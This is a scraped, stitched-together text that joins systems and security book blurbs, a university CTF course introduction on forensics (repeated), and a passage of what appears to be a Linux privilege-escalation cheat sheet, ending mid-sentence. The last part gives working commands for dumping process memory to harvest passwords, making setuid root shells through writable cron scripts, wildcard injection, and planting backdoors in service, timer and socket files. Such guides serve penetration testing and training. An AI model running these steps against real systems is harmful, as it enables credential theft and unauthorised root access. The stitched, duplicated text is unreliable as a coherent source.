Students learn best by developing and evaluating real programs that run on real machines. We cover data representations, machine level representations of C programs, processor architecture, program optimizations, the memory hierarchy, linking, exceptional control flow (exceptions, interrupts, processes, and Unix signals), virtual memory and memory management, system-level I/O, basic network programming, and concurrent programming.

Bovet (Author), Marco Cesati (Author) Overview In order to thoroughly understand what makes Linux tick and why it works so well on a wide variety of systems, you need to delve deep into the heart of the kernel. The kernel handles all interactions between the CPU and the external world, and determines which programs will share processor time, in what order. It manages limited memory so well that hundreds of processes can share the system efficiently, and expertly organizes data transfers so that the CPU isn't kept waiting any longer than necessary for the relatively slow disks. The third edition of Understanding the Linux Kernel takes you on a guided tour of the most significant data structures, algorithms, and programming tricks used in the kernel. Probing beyond superficial features, the authors offer valuable insights to people who want to know how things really work inside their machine. Important Intel-specific features are discussed. Relevant segments of code are dissected line by line. But the book covers more than just the functioning of the code; it explains the theoretical underpinnings of why Linux does things the way it does. This edition of the book covers Version 2.6, which has seen significant changes to nearly every kernel subsystem, particularly in the areas of memory management and block devices. The book focuses on the following topics: Memory management, including file buffering, process swapping, and Direct memory Access (DMA) The Virtual Filesystem layer and the Second and Third Extended Filesystems Process creation and scheduling Signals, interrupts, and the essential interfaces to device drivers Timing Synchronization within the kernel Interprocess Communication (IPC) Program execution Understanding the Linux Kernel will acquaint you with all the inner workings of Linux, but it's more than just an academic exercise. You'll learn what conditions bring out Linux's best performance, and you'll see how it meets the challenge of providing good system response during process scheduling, file access, and memory management in a wide variety of environments. This book will help you make the most of your Linux system.

New material has been added since the 6th edition (which covered Windows 7 and Windows Server 2008 R2). Since the 7th edition\u2019s part 2 is not yet available, the Windows Internals 6th edition (written by Mark Russinovich, David Solomon and Alex Ionescu) is an invaluable resource on missing topics from the first part of the 7th edition. These include system mechanisms, management mechanisms, networking, file systems, cache management and troubleshooting system crashes. History of the Book This is the seventh edition of a book that was originally called Inside Windows NT (Microsoft Press, 1992), written by Helen Custer (prior to the initial release of Microsoft Windows NT 3.1). Inside Windows NT was the first book ever published about Windows NT and provided key insights into the architecture and design of the system. Inside Windows NT, Second Edition (Microsoft Press, 1998) was written by David Solomon. It updated the original book to cover Windows NT 4.0 and had a greatly increased level of technical depth. Inside Windows 2000, Third Edition (Microsoft Press, 2000) was authored by David Solomon and Mark Russinovich. It added many new topics, such as startup and shutdown, service internals, registry internals, file-system drivers, and networking. It also covered kernel changes in Windows 2000, such as the Windows Driver Model (WDM), Plug and Play, power management, Windows Management Instrumentation (WMI), encryption, the job object, and Terminal Services. Windows Internals, Fourth Edition was the Windows XP and Windows Server 2003 update and added more content focused on helping IT professionals make use of their knowledge of Windows internals, such as using key tools from Windows Sysinternals and analyzing crash dumps. Windows Internals, Fifth Edition was the update for Windows Vista and Windows Server 2008. It saw Mark Russinovich move on to a full-time job at Microsoft (where he is now the Azure CTO) and the addition of a new co-author, Alex Ionescu. New content included the image loader, user-mode debugging facility, Advanced Local Procedure Call (ALPC), and Hyper-V. The next release, Windows Internals, Sixth Edition, was fully updated to address the many kernel changes in Windows 7 and Windows Server 2008 R2, with many new hands-on experiments to reflect changes in the tools as well. Seventh Edition Changes Since this series\u2019 last update, Windows has gone through several releases, coming up to Windows 10 and Windows Server 2016. Windows 10 itself, being the current going-forward name for Windows, has had several releases since its initial Release-to-Manufacturing, or RTM, each labeled with a 4-digit version number indicating year and month of release, such as Windows 10, version 1703 that was completed in March 2017. The above implies that Windows has gone through at least 6 versions since Windows 7. Starting with Windows 8, Microsoft began a process of OS convergence, which is beneficial from a development perspective as well as for the Windows engineering team itself. Windows 8 and Windows Phone 8 had converged kernels, with modern app convergence arriving in Windows 8.1 and Windows Phone 8.1. The convergence story was complete with Windows 10, which runs on desktops/laptops, servers, XBOX One, phones (Windows Mobile 10), HoloLens, and various Internet of Things (IoT) devices. With this grand unification completed, the time was right for a new edition of the series, which could now finally catch up with almost half a decade of changes, in what will now be a more stabilized kernel architecture going forward. As such, this latest book covers aspects of Windows from Windows 8 to Windows 10, version 1703. Additionally, this edition welcomes Pavel Yosifovich as its new co-author.

Serving as a textbook, a reference, or for self-study, Introduction to Modern Cryptography presents the necessary tools to fully understand this fascinating subject.","title":"Introduction"},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/#cover","text":"","title":"Cover"},{"location":"Book/Cryptography/Understanding%20Cryptography/","text":"Understanding Cryptography: A Textbook for Students and Practitioners Author: Christof Paar (Author), Jan Pelzl (Author), Bart Preneel (Foreword) Introduction Cryptography is now ubiquitous \u2013 moving beyond the traditional environments, such as government communications and banking systems, we see cryptographic techniques realized in Web browsers, e-mail programs, cell phones, manufacturing systems, embedded software, smart buildings, cars, and even medical implants. Today's designers need a comprehensive understanding of applied cryptography. After an introduction to cryptography and data security, the authors explain the main techniques in modern cryptography, with chapters addressing stream ciphers, the Data Encryption Standard (DES) and 3DES, the Advanced Encryption Standard (AES), block ciphers, the RSA cryptosystem, public-key cryptosystems based on the discrete logarithm problem, elliptic-curve cryptography (ECC), digital signatures, hash functions, Message Authentication Codes (MACs), and methods for key establishment, including certificates and public-key infrastructure (PKI). Throughout the book, the authors focus on communicating the essentials and keeping the mathematics to a minimum, and they move quickly from explaining the foundations to describing practical implementations, including recent topics such as lightweight ciphers for RFIDs and mobile devices, and current key-length recommendations. The authors have considerable experience teaching applied cryptography to engineering and computer science students and to professionals, and they make extensive use of examples, problems, and chapter reviews, while the book\u2019s website offers slides, projects and links to further resources. This is a suitable textbook for graduate and advanced undergraduate courses and also for self-study by engineers.

Guide to Kernel Exploitation: Attacking the Core Author: Enrico Perla B.Sc. Computer Science University of Torino M.Sc. Computer Science Trinity College Dublin (Author), Massimiliano Oldani (Author) Introduction A Guide to Kernel Exploitation: Attacking the Core discusses the theoretical techniques and approaches needed to develop reliable and effective kernel-level exploits, and applies them to different operating systems, namely, UNIX derivatives, Mac OS X, and Windows. Concepts and tactics are presented categorically so that even when a specifically detailed vulnerability has been patched, the foundational information provided will help hackers in writing a newer, better attack; or help pen testers, auditors, and the like develop a more concrete design and defensive structure. The book is organized into four parts. Part I introduces the kernel and sets out the theoretical basis on which to build the rest of the book. Part II focuses on different operating systems and describes exploits for them that target various bug classes. Part III on remote kernel exploitation analyzes the effects of the remote scenario and presents new techniques to target remote issues. It includes a step-by-step analysis of the development of a reliable, one-shot, remote exploit for a real vulnerability a bug affecting the SCTP subsystem found in the Linux kernel. Finally, Part IV wraps up the analysis on kernel exploitation and looks at what the future may hold.

Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. Figure: CTFs on the CTFtime website. These contests run every month by various organizations and universities across the globe. These contests can be arranged in the 3 styles: Jeopardy Attack & Defense Mixed Style Most of the CTFs are online, while some of them (usually finals) are offline. The most famous CTF is the DEF CON CTF , which is held every August annually. In our semester, every lab would have several CTF challenges in Jeopardy format. By the end of this semester, yet another AWD (Attack & Defense) CTF would be hold. Categories In Jeopardy format CTFs, there are usually 5 categories: Forensics Forensics is the art of recovering the digital trail left on a computer. There are plenty of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded. Cryptography Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code. The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis. Web Exploitation Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework. These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privileges. Reverse Engineering Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format. Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues. Binary Exploitation Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Some other categories growing up in recent years, like IoT (Internet of Thing) and AI. Forensics An important part of Forensics is having the right tools, as well as being familiar with the following topics: File Formats EXIF data Wireshark & PCAPs Wireshark traffic analysis Steganography (Optional) Disk Imaging File Formats File Extensions are not the sole way to identify the type of a file, files have certain leading bytes called file signatures which allow programs to parse the data in a consistent manner. Files can also contain additional \"hidden\" data called metadata which can be useful in finding out information about the context of a file's data. File Signatures File signatures (also known as File Magic Numbers) are bytes within a file used to identify the format of the file. Generally they\u2019re 2-4 bytes long, found at the beginning of a file. What is it used for? Files can sometimes come without an extension, or with incorrect ones. We use file signature analysis to identify the format (file type) of the file. Programs need to know the file type in order to open it properly. How do you find the file signature? You need to be able to look at the binary data that constitutes the file you\u2019re examining. To do this, you\u2019ll use a hexadecimal editor. Once you find the file signature, you can check it against file signature repositories such as Gary Kessler\u2019s . Example The file above, when opened in a Hex Editor, begins with the bytes FFD8FFE0 00104A46 494600 or in ASCII \u02c7\u00ff\u02c7\u2021 JFIF where \\x00 and \\x10 lack symbols. Searching in Gary Kessler\u2019s database shows that this file signature belongs to a JPEG/JFIF graphics file , exactly what we suspect. Extensions vs Signature File extension is used to uniquely describe a format of a particular file whereas file signature is the header information that is present in each file . Some operating systems (Windows like) use file extension to bind with applications to open the file, while some other operating systems check file signature in the header to guess the file format (file command in Unix). What about MIME? A media type (also known as a Multipurpose Internet Mail Extensions or MIME type) is a standard that indicates the nature and format of a document, file, or assortment of bytes . It is defined and standardized in IETF's RFC 6838. This type is identified in HTTP packets and DO NOT stipulate the real file format. For example, a MIME type image/jpg means the transferred data LIKELY to be a JPEG image, but user can post a plain text or anything in real body. Example \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u2502 \u2502 HTTP packe \u2502 \u2502 \u2502 \u2502 MIME:image/jpg \u2502 \u2502 \u2502 A \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 \u250c\u2500\u2500\u2510 \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba B \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502flag.jpg \u2502 \u2502 \u2514\u2500\u252c\u2518 \u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u2502 \u25bc \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502GIF89a\\xc8\\x00 \u2502 \u2502\\x96\\x00\\xf7\\x00\u2502 \u2502... \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 The file signature is GIF8 while the file extension is .jpg , with the MIME type image/jpg during HTTP transmission. The given file is a GIF image instead of JPEG file. Metadata Metadata is data about data. Different types of files have different metadata. The metadata on a photo could include dates, camera information, GPS location, comments, etc. For music, it could include the title, author, track number and album. What kind of file metadata is useful? Potentially, any file metadata you can find could be useful. How do I find it? One of our favorite tools is exiftool, which displays metadata for an input file, including: - File size - Dimensions (width and height) - File type - Programs used to create (e.g. Photoshop) - OS used to create (e.g. Apple) Run command line: exiftool(-k).exe [filename] and you should see something like this: Example Let's take a look at File A's metadata with exiftool: File type Image description Make and camera info GPS Latitude/Longitude Timestamps Timestamps are data that indicate the time of certain events (MAC): - Modification \u2013 when a file was modified - Access \u2013 when a file or entries were read or accessed - Creation \u2013 when files or entries were created Types of timestamps Modified Accessed Created Date Changed (MFT) Filename Date Created (MFT) Filename Date Modified (MFT) Filename Date Accessed (MFT) INDX Entry Date Created INDX Entry Date Modified INDX Entry Date Accessed INDX Entry Date Changed Why do we care? Certain events such as creating, moving, copying, opening, editing, etc. might affect the MAC times. If the MAC timestamps can be attained, a timeline of events could be created. Timeline Patterns There are plenty more patterns than the ones introduced below, but these are the basics you should start with to get a good understanding of how it works, and to complete this challenge. Examples We know that the BMP files fileA and fileD are the same, but that the JPEG files fileB and fileC are different somehow. So how can we find out what went on with these files? By using time stamp information from the file system, we can learn that the BMP fileD was the original file, with fileA being a copy of the original. Afterward, fileB was created by modifying fileB, and fileC was created by modifying fileA in a different way. Follow along as we demonstrate. We\u2019ll start by analyzing images in AccessData FTK Imager, where there\u2019s a Properties window that shows you some information about the file or folder you\u2019ve selected. Here are the extracted MAC times for fileA, fileB, fileC and fileD: Note, AccessData FTK Imager assumes that the file times on the drive are in UTC (Universal Coordinated Time). I subtracted four hours, since the USB was set up in Eastern Standard Time. This isn\u2019t necessary, but it helps me understand the times a bit better. Highlight timestamps that are the same, if timestamps are off by a few seconds, they should be counted as the same. This lets you see a clear difference between different timestamps. Then, highlight oldest to newest to help put them in order. Identify timestamp patterns. Wireshark Wireshark is a network protocol analyzer which is often used in CTF challenges to look at recorded network traffic. Wireshark uses a filetype called PCAP to record traffic. PCAPs are often distributed in CTF challenges to provide recorded traffic history. Interface Upon opening Wireshark, you are greeted with the option to open a PCAP or begin capturing network traffic on your device. The network traffic displayed initially shows the packets in order of which they were captured. You can filter packets by protocol, source IP address, destination IP address, length, etc. In order to apply filters, simply enter the constraining factor, for example 'http', in the display filter bar. Filters can be chained together using '&&' notation. In order to filter by IP, ensure a double equals '==' is used. The most pertinent part of a packet is its data payload and protocol information. Decrypting SSL Traffic By default, Wireshark cannot decrypt SSL traffic on your device unless you grant it specific certificates. High Level SSL Handshake Overview In order for a network session to be encrypted properly, the client and server must share a common secret for which they can use to encrypt and decrypt data without someone in the middle being able to guess. The SSL Handshake loosely follows this format: The client sends a list of availble cipher suites it can use along with a random set of bytes referred to as client_random The server sends back the cipher suite that will be used, such as TLS_DHE_RSA_WITH_AES_128_CBC_SHA, along with a random set of bytes referred to as server_random The client generates a pre-master secret, encrypts it, then sends it to the server. The server and client then generate a common master secret using the selected cipher suite The client and server begin communicating using this common secret Decryption Requirements There are several ways to be able to decrypt traffic. If you have the client and server random values and the pre-master secret, the master secret can be generated and used to decrypt the traffic If you have the master secret, traffic can be decrypted easily If the cipher-suite uses RSA, you can factor n in the key in order to break the encryption on the encrypted pre-master secret and generate the master secret with the client and server randoms Steganography Steganography is the practice of hiding data in plain sight. Steganography is often embedded in images or audio. You could send a picture of a cat to a friend and hide text inside. Looking at the image, there\u2019s nothing to make anyone think there\u2019s a message hidden inside it. You could also hide a second image inside the first. Steganography Detection So we can hide text and an image, how do we find out if there is hidden data? FileA and FileD appear the same, but they\u2019re different. Also, FileD was modified after it was copied, so it\u2019s possible there might be steganography in it. FileB and FileC don\u2019t appear to have been modified after being created. That doesn\u2019t rule out the possibility that there\u2019s steganography in them, but you\u2019re more likely to find it in fileD. This brings up two questions: Can we determine that there is steganography in fileD? If there is, what was hidden in it? LSB Steganography File are made of bytes. Each byte is composed of eight bits. Changing the least-significant bit (LSB) doesn\u2019t change the value very much. So we can modify the LSB without changing the file noticeably. By doing so, we can hide a message inside. LSB Steganography in Images LSB Steganography or Least Significant Bit Steganography is a method of Steganography where data is recorded in the lowest bit of a byte. Say an image has a pixel with an RGB value of (255, 255, 255), the bits of those RGB values will look like 1 1 1 1 1 1 1 1 By modifying the lowest, or least significant, bit, we can use the 1 bit space across every RGB value for every pixel to construct a message. 1 1 1 1 1 1 1 0 The reason Steganography is hard to detect by sight is because a 1 bit difference in color is insignificant as seen below. Example Let\u2019s say we have an image, and part of it contains the following binary: And let\u2019s say we want to hide the character y inside. First, we need to convert the hidden message to binary. Now we take each bit from the hidden message and replace the LSB of the corresponding byte with it. And again: And again: And again: And again: And again: And again: And once more: Decoding LSB steganography is exactly the same as encoding, but in reverse. For each byte, grab the LSB and add it to your decoded message. Once you\u2019ve gone through each byte, convert all the LSBs you grabbed into text or a file. (You can use your file signature knowledge here!) What other types of steganography are there? Steganography is hard for the defense side, because there\u2019s practically an infinite number of ways it could be carried out. Here are a few examples: - LSB steganography: different bits, different bit combinations - Encode in every certain number of bytes - Use a password - Hide in different places - Use encryption on top of steganography Blind Watermark Blind watermark is a kind of technique to embed one picture or string to another image. Just like the regular watermark, but the blind watermark cannot be detected by using human eyes. The transformed image is indistinguishable from the origin one. Furthermore, blind watermark should be able to bypass different types of processing of image. For example, rotating the picture should not broke the blind watermark. Some modern researches are focusing on the strong transform of the image, such like film the image from another screen. Example encode: original image watermark python encode.py --image ori.png --watermark watermark.png --result res.png result decode: python decode.py --original ori.png --image res.png --result extract.png watermark Hex Editor A hexadecimal (hex) editor (also called a binary file editor or byte editor) is a computer program you can use to manipulate the fundamental binary data that constitutes a computer file. The name \u201chex\u201d comes from \u201chexadecimal,\u201d a standard numerical format for representing binary data. A typical computer file occupies multiple areas on the platter(s) of a disk drive, whose contents are combined to form the file. Hex editors that are designed to parse and edit sector data from the physical segments of floppy or hard disks are sometimes called sector editors or disk editors. A hex editor is used to see or edit the raw, exact contents of a file. Hex editors may used to correct data corrupted by a system or application. A list of editors can be found on the forensics Wiki. You can download one and install it on your system. Example Open fileA.jpg in a hex editor. (Most Hex editors have either a \u201cFile > Open\u201d option or a simple drag and drop.) When you open fileA.jpg in your hex editor, you should see something similar to this: Your hex editor should also have a \u201cgo to\u201d or \u201cfind\u201d feature so you can jump to a specific byte. Exercise Every lab we will have 2 or 3 challenges about the topics this week. But in case the difficulty of the challenge, only the first 2 challenges are required. But if you want to fight CTF so hard, you can try the third one. Solving the third one would give you extra points for this lab and some prizes as well. For finishing the challenges, you may click this site: COMPASS CTF Platform and find the category CS315 . Other challenges are for CTF team members, but you also can finish them freely. After uploading the flag on the platform, you also need to upload a writeup to blackboard system to grade. The writeup is a file to describe how you solve the challenges and you need also post flag in it. The writeup would use to grade and in case you forget to submit the writeup, during the argue procedure, we would check the submission in platform. Example writeup (5 pt) Congratulations! Now in order to check whether you are a robot, you need to submit this flag to show that you are a real human! flag{w31com3_t0_CS315_c0Urs3!!!} The flag you submit should be flag{w31com3_t0_CS315_c0Urs3!!!} , and the example writeup probably be: Writeup.md I am a human so I copied the flag and submit it.

Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. Figure: CTFs on the CTFtime website. These contests run every month by various organizations and universities across the globe. These contests can be arranged in the 3 styles: Jeopardy Attack & Defense Mixed Style Most of the CTFs are online, while some of them (usually finals) are offline. The most famous CTF is the DEF CON CTF , which is held every August annually. In our semester, every lab would have several CTF challenges in Jeopardy format. By the end of this semester, yet another AWD (Attack & Defense) CTF would be hold.","title":"Introduction to CTF"},{"location":"CS315/Week%201/#categories","text":"In Jeopardy format CTFs, there are usually 5 categories: Forensics Forensics is the art of recovering the digital trail left on a computer. There are plenty of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded. Cryptography Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code. The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis. Web Exploitation Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework. These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privileges. Reverse Engineering Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format. Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues. Binary Exploitation Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions.

Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges\u2026 It is recommended to check manually the version of the more suspicious installed software. dpkg -l #Debian rpm -qa #Centos If you have SSH access to the machine you could also use openVAS to check for outdated and vulnerable software installed inside the machine. Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some application like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits Processes Take a look to what processes are being executed and check if any process has more privileges that it should (maybe a tomcat being executed by root?) ps aux ps -ef top -n 1 Always check for possible electron/cef/chromium debuggers running, you could abuse it to escalate privileges . Linpeas detect those by checking the --inspect parameter inside the command line of the process. Also check your privileges over the processes binaries , maybe you can overwrite someone. Process monitoring You can use tools like pspy to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met. Process memory Some services of a server save credentials in clear text inside the memory . Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials. However, remember that as a regular user you can read the memory of the processes you own . GDB If you have access to the memory of a FTP service (for example) you could get the Heap and search inside of it the credentials. gdb -p <FTP_PROCESS_PID> (gdb) info proc mappings (gdb) q (gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD> (gdb) q strings /tmp/mem_ftp #User and password GDB Script #!/bin/bash #./dump-memory.sh <PID> grep rw-p /proc/$1/maps \\ | sed -n 's/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p' \\ | while read start stop; do \\ gdb --batch --pid $1 -ex \\ \"dump memory $1-$start-$stop.dump 0x$start 0x$stop\"; \\ done /proc/$pid/maps & /proc/$pid/mem For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region . The mem pseudo file exposes the processes memory itself . From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file. procdump() ( cat /proc/$1/maps | grep -Fv \".so\" | grep \" 0 \" | awk '{print $1}' | ( IFS=\"-\" while read a b; do dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \\ skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of=\"$1_mem_$a.bin\" done ) cat $1*.bin > $1.dump rm $1*.bin ) /dev/mem /dev/mem provides access to the system's physical memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem. Typically, /dev/mem is only readable by root and kmem group. strings /dev/mem -n10 | grep -i PASS Tools To dump a process memory you could use: https://github.com/hajzer/bash-memory-dump (root) - You can manually remove root requirements and dump process owned by you Script A.5 from https://www.delaat.net/rp/2016-2017/p97/report.pdf (root is required) Credentials from Process Memory Manual example If you find that the authenticator process is running: ps -ef | grep \"authenticator\" root 2027 2025 0 11:46 ? 00:00:00 authenticator You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory: ./dump-memory.sh 2027 strings *.dump | grep -i password mimipenguin The tool https://github.com/huntergregal/mimipenguin will steal clear text credentials from memory and from some well known files . It requires root privileges to work properly. Feature Process Name GDM password (Kali Desktop, Debian Desktop) gdm-password Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) gnome-keyring-daemon LightDM (Ubuntu Desktop) lightdm VSFTPd (Active FTP Connections) vsftpd Apache2 (Active HTTP Basic Auth Sessions) apache2 OpenSSH (Active SSH Sessions - Sudo Usage) sshd: Scheduled/Cron jobs Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?). crontab -l ls -al /etc/cron* /etc/at* cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v \"^#\" Cron path For example, inside /etc/crontab you can find the PATH: PATH= /home/user :/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin ( Note how the user \"user\" has writing privileges over /home/user ) If inside this crontab the root user tries to execute some command or script without setting the path. For example: root overwrite.sh Then, you can get a root shell by using: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh #Wait cron job to be executed /tmp/bash -p #The effective uid and gid to be set to the real uid and gid Cron using a script with a wildcard (Wildcard Injection) If a script being executed by root has a \u201c * \u201d inside a command, you could exploit this to make unexpected things (like privesc). Example: rsync -a *.sh rsync://host.back/src/rbd #You can create a file called \"-e sh myscript.sh\" so the script will execute our script If the wildcard is preceded of a path like /some/path/* , it's not vulnerable (even ./* is not). Read the following page for more wildcard exploitation tricks: https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks Cron script overwriting and symlink If you can modify a cron script executed by root, you can get a shell very easily: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT> #Wait until it is executed /tmp/bash -p If the script executed by root uses a directory where you have full access , maybe it could be useful to delete that folder and create a symlink folder to another one serving a script controlled by you ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER> Frequent cron jobs You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges. For example, to monitor every 0.1s during 1 minute , sort by less executed commands and deleting the commands that have beeing executed all the time, you can do: for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v \"\\[\" | sed '/^.\\{200\\}./d' | sort | grep -E -v \"\\s*[6-9][0-9][0-9]|\\s*[0-9][0-9][0-9][0-9]\"; rm /tmp/monprocs.tmp; You can also use pspy (this will monitor and list every process that start). Invisible cron jobs It's possible to create a cronjob putting a carriage return after a comment (without new line character), and the cron job will work. Example (note the carriege return char): #This is a comment inside a cron config file\\r* * * * * echo \"Surprise!\" Services Writable .service files Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started , restarted or stopped (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with ExecStart=/tmp/script.sh Writable service binaries Keep in mid that if you have write permissions over binaries being executed by services , you can change them for backdoors so when the services get re-executed the backdoors will be executed. systemd PATH - Relative Paths You can see the PATH used by systemd with: systemctl show-environment If you find that you can write in any of the folders of the path you may be able to escalate privileges . You need to search for relative paths being used on service configurations files like: ExecStart=faraday-server ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I' ExecStop=/bin/sh \"uptux-vuln-bin3 -stuff -hello\" Then, create a executable with the same name as the relative path binary inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action ( Start , Stop , Reload ), your backdoor will be executed (unprivileged users usually cannot start/stop services but check if you can using sudo -l ). Learn more about services with man systemd.service . Timers Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron. Timers have built-in support for calendar time events, monotonic time events, and can be run asynchronously. You can enumerate all the timers doing: systemctl list-timers --all Writable timers If you can modify a timer you can make it execute some existent systemd.unit (like a .service or a .target ) Unit=backdoor.service In the documentation you can read what the Unit is: The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not \".timer\". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix. Therefore, in order to abuse this permissions you would need to: Find some systemd unit (like a .service ) that is executing a writable binary Find some systemd unit that is executing a relative path and you have writable privileges over the systemd PATH (to impersonate that executable) Learn more about timers with man systemd.timer . Enabling Timer In order to enable a timer you need root privileges and to execute: sudo systemctl enable backu2.timer Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer \u2192 /lib/systemd/system/backu2.timer. Note the timer is activated by creating a symlink to it on /etc/systemd/system/<WantedBy_section>.wants/<name>.timer Sockets In brief, a Unix Socket (technically, the correct name is Unix domain socket, UDS ) allows communication between two different processes on either the same machine or different machines in client-server application frameworks. To be more precise, it\u2019s a way of communicating among computers using a standard Unix descriptors file. (From here ). Sockets can be configured using .socket files. Learn more about sockets with man systemd.socket . Inside this file some several interesting parameters can be configured: ListenStream , ListenDatagram , ListenSequentialPacket , ListenFIFO , ListenSpecial , ListenNetlink , ListenMessageQueue , ListenUSBFunction : This options are different but as summary as used to indicate where is going to listen the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen...). Accept : Takes a boolean argument. If true , a service instance is spawned for each incoming connection and only the connection socket is passed to it. If false , all listening sockets themselves are passed to the started service unit , and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. Defaults to false . For performance reasons, it is recommended to write new daemons only in a way that is suitable for Accept=no . ExecStartPre , ExecStartPost : Takes one or more command lines, which are executed before or after the listening sockets /FIFOs are created and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process. ExecStopPre , ExecStopPost : Additional commands that are executed before or after the listening sockets /FIFOs are closed and removed, respectively. Service : Specifies the service unit name to activate on incoming traffic . This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option. Writable .socket files If you find a writable .socket file you can add at the beginning of the [Socket] section something like: ExecStartPre=/home/kali/sys/backdoor and the backdoor will be executed before the socket is created. Therefore, you will probably need to wait until the machine is rebooted. Note that the system must be using that socket file configuration or the backdoor won't be executed Writable sockets If you identify any writable socket ( now where are talking about Unix Sockets, not about the config .socket files ), then, you can communicate with that socket and maybe exploit a vulnerability. Enumerate Unix Sockets netstat -a -p --unix Raw connection #apt-get install netcat-openbsd nc -U /tmp/socket #Connect to UNIX-domain stream socket nc -uU /tmp/socket #Connect to UNIX-domain datagram socket #apt-get install socat socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective 